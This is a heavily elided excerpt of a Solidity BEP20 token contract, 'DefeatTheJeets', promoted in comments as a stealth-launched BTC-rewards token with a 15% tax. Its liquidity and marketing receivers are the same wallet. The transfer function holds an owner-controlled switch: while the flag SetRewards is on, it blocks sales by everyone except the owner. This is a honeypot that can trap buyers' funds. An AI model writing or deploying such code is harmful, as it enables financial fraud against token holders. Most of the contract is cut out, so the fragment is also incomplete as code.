...
// Stealth Launched
// [350FTM]$ Initial Liquidity 
// https://t.me/defeatthejeet
// https://defeatthejeet.xyz
// Rewards in BTC to Holders.
// 15% tax (5% lp, 8%rewards BTC, 2% Marketing)
...
contract DefeatTheJeets is IBEP20, Auth {
    ...
    string constant _name = "DefeatTheJeets";
    ...
    address public autoLiquidityReceiver=0xEc25DA8ECF96E77BEac33CF2e4Ca8f7C594C3cAF; //liq address
    address public marketingFeeReceiver=0xEc25DA8ECF96E77BEac33CF2e4Ca8f7C594C3cAF; // marketing address
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (isSell) {
            require((!SetRewards || sender==owner), "distribution enabled");
